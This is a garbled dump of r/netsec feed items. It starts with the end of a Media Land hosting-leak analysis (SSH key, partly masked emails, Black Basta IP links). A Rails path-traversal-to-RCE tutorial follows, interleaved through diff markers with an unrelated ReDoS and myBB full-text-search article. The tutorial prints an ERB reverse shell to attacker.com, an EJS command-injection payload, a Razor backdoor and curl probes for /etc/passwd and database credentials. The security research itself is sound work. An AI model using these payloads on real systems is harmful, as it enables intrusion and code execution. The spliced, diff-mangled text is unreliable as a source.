AAAAB3NzaC1yc2EAAAADAQABAAACAQDBVAxj75sjjDnExWoIfbK24HIEcwiEQtx4HujnbTgHEdJJwZGyiOj9iombEIUkaLzdKVmSI6bp0iG+onRINM+SAxJtZk6e8zQElygyE8whQnjdpQXm3xvE+8pOVG67whE+tSXUsLV5lj7Y8JUdcDSd2JN0aZH4bCCHwQ9kawwvRL04cKjHS2HfTWVgPuoLQLUxu9bIODCR/9WkmY4Pmgi6NJ6F2wT1nuShE+2+XJXtYquGpcXyIZV2SBxHPZMxab0kz/XfSW+Jq6csZoEd88pVdKGrVsNnveuM7OxMb5XTL58XTAscnZ4VJfHoiVa2Ohw3KojojfleizICA6XHqeOOqIZBzg6WVVmNeYy5CZHnyW65syAjFZJA9j3uMhCE7NpkeaQ8jxiSX4vEEcVcBnSUXviWVAMfWHbI6z/jll5mXmZLHXkz7+JWNM+4pT6PS0UMOZNvv+xuTP5DB6bVBgoGu0S926HW/V75oy+yRwgYAd6Z71HTTVX06tPjbY+q9QiBpK/DhKvEAWGU8WMW/pP4ReZXaihNV7XyM+F1NccjMT+9XyhSKwNpUrNHOruHW6QlEa//VqviDT2WeQuMMl0rrSMMNNQxT0pOLEUmypqOagwYk5IRxhOC6d6/AYHxzR+2uVhe17V4ow1P2XWS2qvOI6eKmopU38WOiEsnSfq8NQ== trans@E-matrexEarlier mentioned  keymvm*****1+2009@gmail.com, mvm*****1+2209@gmail.comEarlier mentioned valentina@valentina-ubuntu keyThis type of clustering helps discover the scale of the infrastructure that some of these accounts are managing. Cluster 2, for example, has a total IP assignment of 8661 IP addresses over two years. Knowing that SSH public keys are reused on this infrastructure is useful, as recent research has shown that these public keys can be scanned for. This may allow us to discover new criminal infrastructure in the long run.So far, I have stayed inside the boundaries of the Media Land leak itself. To understand how this infrastructure was actually used in the wild, I cross-referenced the internal IP-assignment history with publicly known indicators of compromise. For this first pass, I focused on infrastructure linked to the Black Basta ransomware group. The sanctions mentioned in the introduction describe that Media Land is accused of facilitating both the Lockbit and Black Basta ransomware group, and Black Basta had a leak of their own in February 2025, providing access to over 200,000 internal messages. Researchers earlier processed these messages to extract all the relevant information (among which all mentioned IP addresses), noting that the timeline of the leak is between September 2023 and 2024.The Black Basta indicators are available through VirusTotal. For this analysis, I downloaded the IP addresses extracted from this leak and filtered it to IPv4 addresses. Using Python, and after loading the IPs, two simple functions help link IP addresses to users and vice versa.For the function , a date is obviously good to have. Luckily, we know that the Black Basta messages were sent between September ‘23 and September ‘24. Using the two functions in Listing 6, we could test single IP addresses. By executing who_had_ip_at("194.26.25.111", "2024"), the function returns two users:8f728d4a-687e-4aea-bd8d-b44256f5b30c2024-06-23 13:03:10.129669+00:00dfa89b88-7d98-4e57-a3c1-785a8e78c1f0an**************nesm@gmail.com2023-12-08 08:47:40.070893+00:002024-06-23 13:03:10.129669+00:00One of these accounts we have seen before! It is Mister Reseller, whom we found trying to pivot for password reuse! When we look in the profiles we generated earlier, Mister Reseller had 1902 unique IP assignments on this account with the aforementioned ~8.5 BTC in payments. This user also has an explosive number of subscriptions on his account. That is significant, so the next part is about counting which users relate to the Black Basta indicators.Enumerating all accounts that managed Black Basta indicatorsWith the  and  functions, we can scale to count the number of users that (and more importantly, what users) managed an IP address related to Black Basta between September 2023 and September 2024. Now, as we are looking at a hoster, it is plausible that these users are sharing an IP address due to, for example, shared hosting. According to Media Land’s registration, however, these are all rented Virtual Machines with their own IP address. According to , each of the Black Basta-related IPs appears to be assigned to a single user_id at any point in time, with no overlapping assignments in the leak.8f728d4a-687e-4aea-bd8d-b44256f5b30c49b144f3-2648-4598-b7c3-c8a9bb42e60cdfa89b88-7d98-4e57-a3c1-785a8e78c1f040e151cc-121f-4f90-bbfd-4e819c4e144a2deb1533-552e-409b-bd90-d59fb1c0a706303a9cbe-5c15-4329-bd0e-0f600769408def0e1ba8-8323-4cd6-b2a2-194cd488052e67f41c34-1dbe-4747-a304-08ff2ad7542930346179-3b8a-4c72-9120-9f8d64f3c74d2c04a9e3-499d-4a42-b415-12223586531eOf course, this does not immediately mean that we found all the Black Basta criminals and can now send them emails. In total, scouring the leak for these IPs produced a list of 74 distinct user accounts whose assigned IPs between September ‘23 and ‘24 overlap with the Black Basta IOC list. Most of these accounts only have a handful of matches (one or two IPs), which is consistent with Black Basta being Ransomware-as-a-Service. Therefore, it could be that Media Land also had some Black Basta affiliates on their networks. More importantly, however, is the detail of the account with the largest footprint having the account name “Mister Reseller”. Thus, it could as well be that these accounts are acting as a reseller to Black Basta, brokering access to the Media Land infrastructure. As Figure 4 shows, there is one account that stands out in terms of footprint.It is worth stressing that these overlaps do not prove that any given account belongs to Black Basta themselves. However, they illustrate how internal hosting records and abuse indicators can be combined to at least reveal a supply-chain layer behind a ransomware operation: which customers provisioned the infrastructure later used in attacks, and which intermediaries may have been brokering access.With the UK, US, and Australia having announced sanctions against Media Land for being a Bulletproof Hoster, this leak gives a rare look into how this type of infrastructure actually operates. Its value lies in the structural patterns that emerge across billing, provisioning, and IP assignment. Taken together, these records show how services are organised, how address space is recycled at scale, and how reseller-like entities act as intermediaries between the platform and the actors who rely on it.Linking the internal history to external indicators such as the Black Basta IPs does not identify individuals. It does, however, reveal part of the supply chain behind ransomware operations by showing which customer segments provisioned infrastructure later used in attacks and how access may have been brokered.For defenders and researchers, this shifts the focus from single malicious IPs to the ecosystem that generates them. Leaks like this help build an evidence-based understanding of how bulletproof hosting functions in practice and where meaningful points of intervention may exist.]]></content:encoded></item><item><title>Write Path Traversal to a RCE Art Department</title><link>https://lab.ctbb.show/research/write-path-traversal-to-RCE-art-department</link><author>/u/alt69785</author><category>netsec</category><pubDate>Fri, 28 Nov 2025 01:06:06 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[CriticalThinking Research members are treated as artists thus here is my small and rare moment of sharing publicly thoughts, insides and art. In the modern world, it is common people to hide, to hide knowledge, to hide thoughts, to hide from life, but in the CT community, we do opposite, we can share what we know, what we feel, what we think, what we critically think! Play that music and enjoy the process of sharing!Things will be discovered and patched so… Share!In our previous article - ASP.NET MVC View Engine Search Patterns, we explored the inner workings and logic behind ASP.NET MVC search patterns. Building on that foundation and the shared understanding we’ve now established, today we’ll dive deeper into more languages.As pentesters, bug bounty hunters,…(whoever consider yourself)., we’re constantly confronted with new programming languages, frameworks, and technologies — it’s absolute chaos out there (especially when you’re pushing 40 and still fondly remember the golden era of BBSs and blazing-fast 33.6K modems 😄).This article takes a closer look at how Ruby resolves templates, examines the underlying behavior, and includes a practical comparison matrix/cheatsheet showing how different languages and frameworks handle similar view/template resolution mechanisms. The matrix is designed to expand over time with additional languagesFor those short on time, feel free to jump straight to the Cheat Sheet - The Short Version section below — it has everything you need at a glance.
+For everyone else, grab a coffee and enjoy the full read!Similar to ASP.NET MVC’s View Engine search pattern vulnerability, Ruby on Rails has an analogous attack surface through the combination of , , and . Both vulnerabilities exploit framework-level file resolution mechanisms that bypass web server protections.Part 1: Understanding Rails Auto-loading with ZeitwerkThe Convention-Over-Configuration PatternRails follows strict naming conventions where file paths automatically map to class names:The Zeitwerk loader uses  to convert file paths to constants:File Path -> Constant Nameapp/controllers/users_controller.rb -> UsersController
+app/controllers/admin/payments_controller.rb -> Admin::PaymentsController
+app/models/user.rb -> User
+app/services/payment_processor.rb -> PaymentProcessor
+How Zeitwerk Auto-loading WorksWhen your Rails application references an undefined constant, Zeitwerk intercepts it:Ruby raises NameError: uninitialized constant UserZeitwerk intercepts this errorConverts  →  (reverse camelize)Searches autoload paths:  using The constant  is now definedExecution continues normally This happens automatically without explicit  statements, and the file is  when loaded.Rails automatically configures these directories as autoload paths:app/controllers/
+app/models/
+app/helpers/
+app/mailers/
+app/jobs/
+app/services/
+lib/
+Any  file in these directories can be auto-loaded based on naming conventions.Part 2: Rails Routing & Implicit RenderingRails routes map URLs to controller actions: →  →  with Rails supports  that capture everything including slashes:Request: GET /files/documents/2024/report.pdf = "documents/2024/report.pdf" (includes slashes!)
+    If a controller action doesn’t explicitly render something, Rails automatically looks for a template:The implicit render searches for templates matching the pattern:app/views/<controller_name>/<action_name>.<format>.<engine>
+Part 3: The Vulnerability - CVE-2014-0130The vulnerability occurs when applications use wildcard routing with the  parameter:This routing pattern tells Rails:Match any URL starting with Capture everything after as the  parameterRoute to the specified controllerWildcard routes capturing Directory traversal sequences ()Accept the action parameter with traversal sequencesTry to render a template using that action nameNot properly sanitize the pathExploitation Example 1: File DisclosureRails routes to  = Implicit render looks for template: app/views/pages/../../../../etc/passwdPath traversal resolves to  (if Rails can read it)Exploitation Example 2: Code Execution via Template Injection
+Assume the attacker has  via another vulnerability (upload, path traversal in a different endpoint, etc.)Step 1: Write malicious ERB template
+Attacker uploads a file to a predictable location:Step 2: Trigger via wildcard routeRails accepts action = "../../public/uploads/evil.html"Implicit render searches for: app/views/pages/../../public/uploads/evil.html.erbPath resolves to: public/uploads/evil.html.erbRails loads and executes the ERB templateEmbedded Ruby code () executes with app privilegesRemote code execution achievedPart 4: Zeitwerk Auto-loading Attack SurfaceController Auto-loading VulnerabilityWhile less common, if an application uses wildcard routing with :This creates an even worse attack surface.
+Write a file to app/controllers/admin/evil_controller.rbZeitwerk auto-loads The malicious controller code Actions in that controller become accessibleMalicious Controller ExampleAttacker writes to: app/controllers/admin/evil_controller.rb Remote command execution.Part 5: Real-World ExamplesExample 1: Rails App with Dynamic PagesBetter vulnerable example:app/views/help/
+faq.html.erb
+getting-started.html.erb
+tutorials.html.erb
+Renders: app/views/help/faq.html.erb ✓Attempts to render: app/views/help/../../../../config/database.yml
+Resolves to:  Database credentials disclosed!Example 2: File Upload + Wildcard Route RCE Application has file upload but “restricts” to images only (client-side validation)Step 1: Upload malicious ERB disguised as image
 
-A quantifier specifies how many times the preceding element must occur for a
-match to happen.
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-Quantifier | Meaning                           | Regex | Match
-++++++++++++++++++++++++++++++++++++++++++++
-*                | Zero or more times          | p*       | "","p","ph"...
-+                | One or more                   | p+       | "p","ph","phr"
-?                | Zero or one                     | p?       | "", "p"
-{n}              | n times                           | p{3}     | "ppp"
-{n,}             | n or more times              | p{2,}    | "pp","ppp"...
-{n,m}          | Between n and m times | p{2,4}  | "pp", "ppp", "pppp"
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="avatar.jpg"
+Content-Type: image/jpeg
 
-Nested quantifiers are patterns where a quantifier is applied to a subpattern
-that already has a quantifier. So I can't just take p+? pattern, add
-quantifier + and make it p+?+, because the syntax is invalid. This is where
-"Capturing group" comes to help. The p+ means "one or more p." When we add ?
-to it, it means "one or more p's (the + part), but not more than one (the ?
-part) p." It means that if the input is "ppp," the output will match exactly
-one p. So the output will be Match 1 (p), Match 2 (p), Match 3 (p). Now
-when I group this subpattern (p+?), the pattern match will stay the same,
-and the group match will be the same as the pattern match, because there is
-no extra quantifier. If I change it a bit by adding +, making it (p+?)+, it
-will mean "one or more p's, but not more than one p, repeated one or more
-times until it succeeds." So the subpattern will repeat until it succeeds;
-the inner regex takes the first p, second p, and third p. Now that no more
-characters are left, the pattern stops. Overall match is the concatenation
-of all results "ppp." A capturing group only "remembers" the last result of
-the subpattern, which is "p."
-
-Pattern  | Meaning of pattern   | Regex | Match Result  |
-++++++++++++++++++++++++++++++++++++++++++
-(...)        | groups a subpattern | (p+?)+ | "ppp" (pattern |
-match), "p" (group match)
-++++++++++++++++++++++++++++++++++++++++++
-ReDoS (Regular Expression Denial of Service) is a vulnerability where a regex
-lets an attacker supply input that makes the engine backtrack for an
-extremely long time, causing DoS. Usually, regex that has nested qualifiers
-leads to ReDoS.
-
-To create a ReDoS payload, our inner quantifier should grab as much as it
-can. Therefore, the subpattern could be something like a+ or a*. If our
-input is aaaac, it will match aaaa. Next, we can create a nested quantifier
-by using a* as the subpattern and then adding a + quantifier. This way, the
-a* group will match repeatedly until it succeeds. Our new regex is (a*)+.
-
-If the input is aaaac, the first match is aaaa. Then, because the asterisk
-(*) means "zero or more," we also get zero-length matches. For instance,
-after aaaa is matched, there is an empty match between aaaa and c, and
-another empty match after c, giving three matches in total (two of which are
-empty).
-
-We can force a mismatch after these matches by adjusting the pattern to
-expect the string to end with b, even though our input ends with c. Hence,
-the new regex is (a*)+b, and our input remains aaaac. The (a*)+ part can
-match aaaac in numerous ways because a* can match zero or more 'a's, and the
-+ quantifier allows multiple such matches. Each different way (a*)+ can
-consume part of the string is a "possible result" for that subpattern. Since
-the overall regex (a*)+b fails on its first attempt, the regex engine must
-backtrack and see if there was another way for (a*)+ to match aaaac that
-might allow the subsequent b to match. The bigger the input, the more
-backtracking possibilities are created, leading to a potential DoS.
-
-For example (just for demonstration), consider ways of partitioning aaaa into
-one or more non-empty groups of a. This is not exactly how most regex
-engines work, but it illustrates the concept of multiple ways to match.
-1: ("aaaa")
-2: ("aaa")("a")
-3: ("aa")("aa")
-4: ("a")("aaa")
-5: ("aa")("a")("a")
-6: ("a")("aa")("a")
-7: ("a")("a")("aa")
-8: ("a")("a")("a")("a")
-
-Pattern | Description                               | Input     |
------------|-----------------------------------------|------------|
-(a*)+b   | inner a+ (1 or more a), outer    | aaaac   |
-             | (...)+ repeats                            |              |
------------|-----------------------------------------|------------|
-Example script to demonstrate ReDoS:
-____________________________________________________________
-package main
-
-import (
-    "fmt"
-    "os"
-    "os/exec"
-    "os/signal"
-    "strings"
-    "syscall"
-    "time"
-    "github.com/dlclark/regexp2"
-)
-
-func main() {
-    fmt.Println("ReDoS PoC")
-    count := 200
-    pid := os.Getpid()
-    re := regexp2.MustCompile(`(a*)+b`, 0)
-    input := strings.Repeat("a", count) + "c"
-    sigs := make(chan os.Signal, 1)
-    signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
-    done := make(chan struct{})
-    go func() { <-sigs; close(done); os.Exit(0) }()
-    go func() { re.MatchString(input); close(done) }()
-    for {
-        select {
-        case <-done:
-            return
-        default:
-            out, _ := exec.Command("ps", "-p", fmt.Sprintf("%d", pid),
-                "-o", "%cpu=").Output()
-            cpu := strings.TrimSpace(string(out))
-            fmt.Printf("CPU usage: %s\n", cpu)
-            time.Sleep(500 * time.Millisecond)
-        }
-    }
-}
-____________________________________________________________
-Response:
-khatai@5df0825ade8a tmp % go run main.go
-ReDoS PoC
-CPU usage: 0.0
-CPU usage: 80.2
-CPU usage: 97.7
-CPU usage: 100.0
-CPU usage: 100.0
-
-----[ 2.2 - REGEXP, RLIKE and others
-Beyond application-level regex engines, many database systems also use
-regular expressions for matching strings. Let's, for instance, take REGEXP.
-REGEXP itself can lead to information disclosure, and prepared statements
-won't help, as this has nothing to do with the regex itself. It all comes
-down to insecure implementation. For example, in a case where an SQL query
-is like this: SELECT Name FROM Data WHERE Content REGEXP '^?', using
-prepared statements or backslashing (preg_quote) won't be much help. If user
-input is .*, it all will look like this:
-Input: '.*'
-Trimmed: '.*'
-preg_quote()'d and escaped: '\.\*'
-Final REGEXP Pattern: '^\.\*'
-SELECT Name FROM Data WHERE Content REGEXP '^\.\*';
-
-Problems like these can be easily fixed if there is a "visibility" column
-or some special prevention against regex cases. In most applications, there
-probably are implementations to prevent these cases from happening. So we
-will want an SQL function, which accepts a "sequence of characters that
-specifies a match pattern in text" (which basically defines regex) but isn't
-documented as a regex function in the MySQL documentation.
-
---[ 3 - How insecure, secure implementations are?
-Let's take `real_escape_string` for example; everything seems fine, as it
-escapes single and double quotes, which are usually enough. But if you take
-a look at "backup" and similar options of most systems, you will notice
-that they don't use single/double quotes, they use backticks for table
-names. Backticks are used mostly with REPAIR, EXPORT, OPTIMIZE, ANALYZE,
-TRUNCATE, ALTER and so on. It might seem dumb, but I consider this as
-insecure design rather than insecure implementation. The C API function
-`mysql_real_escape_string_quote`, escapes backticks, while nothing else I
-have seen does. The above part was just an example, a "noteworthy comment"
-if you will.
-
-The real deal is Full-Text Search Functions. They are used in most
-softwares, especially blogs, LMS, and forums for advanced searching.
-According to Wikipedia, "Full-text search refers to techniques for searching
-a single computer-stored document or a collection in a full-text database".
-When performing Full-text search (from now on FTS) DBMS use certain
-characters with special meanings. These characters also specify match
-pattern, which defines regex, but not the usual regex we know of; this one
-is custom. MySQL can perform boolean full-text searches using special
-boolean mode operators; the syntax looks like this: MATCH (col1,col2,...)
-AGAINST (expr [search_modifier]). But before going into that, here is a
-basic table showing the difference between the Regex we know and Boolean
-Mode Operators.
-
-Character  | Traditional Regex | MySQL Boolean Mode        |
-________________________________________________
-| +        | one or more                   | word must be present       |
-| -         | No special meaning       | word must not be present |
-| *         | zero or more                  | Wildcard character           |
-| ^        | start of string or line       | No special meaning          |
-| $        | end of string or line        | No special meaning          |
-| .         | Wildcard character         | No special meaning          |
-| ()        | Grouping subpatterns   | Grouping subexpressions  |
-| []        | any character in the set | No special meaning           |
-| {n,m} | between n and m           | No special meaning           |
-| ""       | No special meaning        | exact sequence of words  |
-| <       | No special meaning        | increases weight of term    |
-| >       | No special meaning         | decreases weight of term  |
-| ~       | No special meaning         | same as decrease weight |
-_________________________________________________
-Example query from MySQL Doc, which shows queries containing MySQL and not
-containing YourSQL:
-mysql> SELECT * FROM articles WHERE MATCH (title,body)
-    -> AGAINST ('+MySQL -YourSQL' IN BOOLEAN MODE);
-_____________________________________
-| id | title                                    | body               |
-++++++++++++++++++++++++++++++++++++
-|  1 | MySQL Tutorials For         | DBMS stands |
-|  2 | How To Use MySQL Well | After you went |
-|  3 | Optimizing MySQL in the | In this tutorial   |
-|  4 | 1001 MySQL Tricks          | 1. Never run    |
-|  6 | MySQL Security               | When configu. |
-_____________________________________
-
-I think you see the problem now, there aren't any special implementations
-that would prevent these special operators (custom regex) from executing and
-the query itself is in quotes. So, we found something that:
-1. Doesn't require any escape
-2. Isn't identified by WAFs/SASTs/DASTs or anything else
-3. Has the possibility of leaking data
-
-Now the pros against REGEXP, RLIKE, LIKE and normal search:
-1. No one calls it regex, so input often won't be sanitized against
-   asterisks, etc.
-2. Has logic which might come in handy if needed
-
-The attack vector on which we should focus is Search functions, especially
-the ones which show "name" but don't show content, or show "count" of
-documents that contain a "content". Basically, anything that gives you an
-idea of the word "contains".
-
-Obviously, this kind of stuff isn't about theory, it is about practice. So
-I downloaded a list of open source web applications using a database and
-identified this pattern in some of them. The quickest and only fix at the
-moment was done by myBB team and identified as CVE-2025-48941. Before going
-further, here is a list of similar functions in other DBMSs.
-
-DBMS            | Full-text function / predicate
-_______________________________________________________________
-MySQL          | MATCH(col) AGAINST ('+python -java' IN BOOLEAN MODE)
-PostgreSQL  | to_tsvector(col) @@ to_tsquery('python & !java') or
-                      | @@ websearch_to_tsquery('python -java')
-SQL Server   | CONTAINS(col, ' "python" AND NOT "java" ')
-Oracle DB     | CONTAINS(col, 'python AND NOT java') > 0
-IBM Db2        | CONTAINS(col, '"python" & !"java"') =1
-_______________________________________________________________
-
---[ 4 - Study Case: myBB
-This section covers analysis of CVE-2025-48941. In my test env I enabled
-FTS. I put "Search Flood Time (seconds)" to 0, to ease my work, having
-multiple accounts or using proxies would provide the same effect (this value
-isn't crucial, it is only for the exploit to work faster), and I have 2
-deleted threads with titles "jackie chan" and
-"0ce3266d4eb71ad50f7a90aee6d21dcd"
-
-----[ 4.1 - Identification
-Deleted threads are visible to an admin when searching, and the search
-function is the same for an admin and a user, so the question is, what will
-be visible exactly?
-
-The `perform_search_mysql_ft` uses MATCH AGAINST functions when searching.
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-$message_lookin = "AND MATCH(message) AGAINST('"
-  .$db->escape_string($keywords)."' IN BOOLEAN MODE)";
-$subject_lookin = "AND MATCH(subject) AGAINST('"
-  .$db->escape_string($keywords)."' IN BOOLEAN MODE)";
---------------------------------------------------------------------------
-It is seen that there are 2 main options to MATCH AGAINST, message or
-subject. But before going into this, we have to understand how keywords are
-passed.
-
-Firstly, `perform_search_mysql_ft` takes the keyword and passes it into the
-`clean_keywords_ft` function
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-function perform_search_mysql_ft($search)
-{
-    global $mybb, $db, $lang;
-
-    $keywords = clean_keywords_ft($search['keywords']);
---------------------------------------------------------------------------
-
-----[ 4.2 - Perfect Match Against Sanitization
-So I am searching for "jack*". My "jack*" transformed into "jack"; to
-understand the reason, let's check the `clean_keywords_ft` function itself.
-In basic regex:
-------------------
-(\b.{1,2})(\s)|(\b.{1,2}$)
-------------------
-As you can see, it has \b (word boundary) which exists in these positions:
-* Between a "word character" and a "non-word character" (which is anything
-  not \w, like *, (, +, space, etc.).
-* Between a "non-word character" and a "word character".
-* At the beginning of the string if the first character is a \w.
-* At the end of the string if the last character is a \w.
-Because of the first reason, the asterisk gets replaced.
-
-To bypass it, I can simply add "ZZ" at the end. Because .{1,2}$ matches the
-last 1 or 2 characters. And now that the string is "jack*ZZ", the "*ZZ" part
-is between a "non-word character"(*) and a "word character" (ZZ). So the
-word character (ZZ) gets replaced and "jack*ZZ" becomes "jack*".
-
-After the `clean_keywords_ft` function, our keyword will be passed inside:
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-$word = str_replace(array("+", "-", "*"), '', $word);
---------------------------------------------------------------------------
-
-So our asterisk gets replaced again. Now to bypass it I will use 2 keywords;
-the first keyword will be "&&&&&". There is no special reason for that, I
-just need an extra keyword which will be ignored by MATCH AGAINST.
---------------------------------------------------------------------------
-mysql> SELECT t.tid, t.firstpost FROM mybb_threads t WHERE 1=1 AND
-    -> MATCH(subject) AGAINST('+&&&&& +jack*' IN BOOLEAN MODE);
-+-----+-----------+
-| tid | firstpost |
-+-----+-----------+
-|   2 |         2 |
-+-----+-----------+
-1 row in set (0.00 sec)
---------------------------------------------------------------------------
-
-This one seems to be working. So I am passing &&&&& +jack*ZZ as input so
-that it would be converted into +&&&&& +jack*. The second asterisk won't get
-removed, and here is the reason:
---------------------------------------------------------------------------
-/inc/functions_search.php
-
-function perform_search_mysql_ft($search)
-{
-    global $mybb, $db, $lang;
-    $keywords = clean_keywords_ft($search['keywords']);
-    if($mybb->settings['minsearchword'] < 1)
+<%= system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") %>
+------WebKitFormBoundary--
+File saved to: public/uploads/avatar.jpgStep 2: Rename/copy to .erb extension (via path traversal in another endpoint, or if predictable naming). Or attacker finds the app also accepts  files in certain directories. However. this step is actually  in some cases. Rails might still process the file as ERB if:
+  - The implicit render path resolves to it
+  - Rails is configured to handle that extension
+  - The file contains ERB delimiters <%= %>For reliability purposes, the attacker would typically need the .erb extension or Rails won’t treat it as an ERB template.Step 3: Trigger via wildcard routeIf Rails treats this as a template, the embedded Ruby executes → .Example 3: Auto-loading + Malicious Controller App has arbitrary file write via path traversal in a separate vulnerabilityStep 1: Write malicious controllerStep 2: Trigger auto-loadingRails routes to Zeitwerk auto-loads app/controllers/backdoor_controller.rbController class is  action executes with command injectionHow we can identify if there is a wildcard endpoints? There a couple techniques which we can use to identify a possible vulnerable endpointPath Traversal Probing (Best Method)Test if path traversal works in different URL segmentscurl -i https://target.com/pages/test
+curl -i https://target.com/pages/../test
+curl -i https://target.com/pages/../../test
+curl -i https://target.com/pages/../../../../etc/passwd
+Different responses (200 vs 404 vs 500)File disclosure in response bodyError messages revealing file pathsResponse time differencesError Message FingerprintingWildcard routes often produce distinctive Rails errors:curl -i https://target.com/pages/nonexistent
+Wildcard route indicators:Template is missing → Implicit rendering attempting to find templateMissing template pages/nonexistent → Shows it’s looking for a template with your inputNo route matches → Explicit routes only (no wildcard)Example error that reveals wildcard routing:
+ActionView::MissingTemplate: Missing template pages/../../../../etc/passwdPath traversal sequences acceptedImplicit rendering activeTest common Rails wildcard endpointscurl -i https://target.com/render/test
+curl -i https://target.com/pages/test
+curl -i https://target.com/docs/test
+curl -i https://target.com/help/test
+curl -i https://target.com/content/test
+200 OK or “Template missing” = likely wildcard404 Not Found = likely explicit routingDirectory Brute-forcing Behaviorcurl -i https://target.com/pages/random123
+curl -i https://target.com/pages/totally_fake_action
+Returns Template is missing (tries to render)Returns 500 error (tries to find template)Returns 404 or routing error immediatelyNever mentions “template”Response Difference Analysiscurl -i https://target.com/pages/known_page    # Legitimate page
+curl -i https://target.com/pages/fake_page     # Non-existent
+curl -i https://target.com/pages/../fake       # Traversal attempt
+All return similar HTTP codes (500/200)Error messages reveal template pathsContent-Type remains consistentGeneric “not found” pagesNo mention of templates/viewstime curl -s https://target.com/pages/test > /dev/null
+time curl -s https://target.com/pages/../../../../etc/passwd > /dev/null
+Wildcard routes with file system access will have:Longer response times (file system lookups)Variable timing based on path depthThe “Golden Test” (Most Reliable)curl -v https://target.com/pages/../../../../etc/passwd 2>&1 | grep -i "missing template\|passwd"
+If wildcard route exists:Error: Missing template pages/../../../../etc/passwdOr: Actual /etc/passwd contents404 Not Found or No route matchesCommon Rails Wildcard Endpoints/render/*
+/pages/*
+/docs/*
+/help/*
+/content/*
+/api/*
+/admin/*
+Without wildcard routing, that specific CVE doesn’t apply, and many developers/SOCs/.. are aware of it thus it is more rare to find it. If there’s NO action or controller wildcard routing, the attack surface becomes much more constrained, but not zero!Exact Template Path OverwritesAttacker has file-write capability via separate vulnerabilityWrites malicious template to EXACT expected path: app/views/users/profile.html.erb
+    Request GET /users/profileRails renders the poisoned template → RCEController Auto-loading Without Wildcard RoutesThis is trickier. Modern Rails apps typically use explicit routes, so even if you write:Without a route pointing to it, Rails won’t route requests there. You’d need: So without wildcard routing OR existing routes to your malicious controller, Zeitwerk auto-loading alone doesn’t help much.Modifying Existing Templates (Not Creating New Ones)If attacker can  the existing template:Request: GET /dashboard?cmd=whoami → RCE,  but this requires modifying existing files, not just creating new ones.With Wildcard Routing (CVE-2014-0130):get ‘/render/*action’, controller: ‘pages’
+Attacker can:Write file ANYWHERE: public/uploads/evil.erb, /tmp/evil.erb, etc.Use path traversal in URL: GET /render/../../public/uploads/evilRails resolves the path and renders itHigh flexibility in file placementWithout Wildcard Routing:get ‘/profile’, to: ‘users#profile’
+Attacker must:Write file to EXACT location: app/views/users/profile.html.erbNo path traversal possible via URLMuch more constrained - needs to know exact route-to-template mappingLow flexibility - must predict exact pathsThe wildcard routing is what makes it a “weaponized” vulnerability (CVE-worthy), but the fundamental framework behavior (auto-rendering templates) is still an attack surface even without wildcards.Cross-Framework Exploitation GuideThis cheatsheet covers how file-write vulnerabilities combined with path traversal can lead to Remote Code Execution (RCE) across different web frameworks by exploiting framework-level file resolution mechanisms.Partial (SSTI, )Partial (SSTI, )Step 1: Understanding Framework File ResolutionView() → Searches: ~/Views/{Controller}/{Action}.cshtml
+Uses: Internal File.Exists() → Bypasses IIS filtering
+~/Views/Home/Index.cshtml~/Views/Shared/_Layout.cshtml~/Areas/{Area}/Views/{Controller}/{Action}.cshtmlImplicit Render → Searches: app/views/{controller}/{action}.{format}.erb
+Zeitwerk Auto-loading → app/controllers/{name}_controller.rb → NameController
+Uses: Framework file operations → Bypasses Rack/web server filtering
+app/views/users/profile.html.erbapp/controllers/admin/users_controller.rb → res.render('view', data) → Searches: views/{view}.{engine}
+Uses: require() for engines → Bypasses static file serving
+view('name') → Searches: resources/views/{name}.blade.php
+Uses: include/require → Bypasses web server restrictions
+resources/views/welcome.blade.phpresources/views/users/profile.blade.phpapp/Http/Controllers/UserController.phprender(request, 'template.html') → Searches: templates/{template.html}
+Auto-loading: Not by default (INSTALLED_APPS)
+Uses: open() for templates
+app_name/templates/app_name/view.html (for code execution)render_template('template.html') → Searches: templates/{template.html}
+Uses: Jinja2 engine → Can exploit SSTI
+templates/users/profile.html (for code execution)c.HTML(200, "template.html", data) → Must explicitly parse templates
+No auto-loading → Must template.ParseFiles() first
+Uses: Manual file operations
+Depends on developer configurationStep 2: Wildcard/Dynamic Routing Vulnerabilities Controller/Action names with path traversal
+ View Engine searches can be manipulated Direct path traversal via  or GET /pages/../../../../etc/passwd Template engine options injection
+GET /render/profile?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('calc');//
+ Direct view name control with path traversal
+GET /page/../../../../config/database Path traversal in template name
+GET /page/../../../../etc/passwd Path traversal in template name
+GET /page/../../../../etc/passwd Server-Side Template Injection
+ SSTI payloads to read files via framework gadgetsStep 3: Attack PrerequisitesPath traversal to Path traversal to  or Wildcard route OR exact route matchRender call with user dataPath traversal to File-write to  ORDebug mode (for auto-reload)Framework context in templateSpecific gadgets availableStep 4: Exploitation PayloadsASP.NET MVC - RCE via Razor Template~/Views/Home/Backdoor.cshtml@{
+    var cmd = Request["cmd"];
+    if (!string.IsNullOrEmpty(cmd))
     {
-        $mybb->settings['minsearchword'] = 4;
-    }
-    $message_lookin = $subject_lookin = '';
-    if($keywords)
-    {
-        $keywords_exp = explode("\"", $keywords);
-        $inquote = false;
-        foreach($keywords_exp as $phrase)
+        var proc = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
         {
-            if(!$inquote)
-            {
-                $split_words = preg_split("#\s{1,}#", $phrase, -1);
-                foreach($split_words as $word)
-                {
-                    $word = str_replace(array("+", "-", "*"), '', $word);
-                    if(!$word)
-                    {
-                        continue;
-                    }
-                    if(my_strlen($word) < $mybb->settings['minsearchword'])
-                    {
-                        $all_too_short = true;
-                    }
-                    else
-                    {
-                        $all_too_short = false;
-                        break;
-                    }
-                }
-            }
---------------------------------------------------------------------------
-The `split_words` array will be: `0=>"+&&&&&"`, `1=> "+jack*"`. The
-`foreach` loop will process "+&&&&&" first and it will become "&&&&&".
-Because '+', '-', and '*' get replaced with nothing. Then, if the length of
-"&&&&&" is less than `minsearchword` (which is 4 and was set inside
-`perform_search_mysql_ft`), it will continue the `foreach` loop; otherwise,
-it will set `all_too_short` to false and break the `foreach` loop. In our
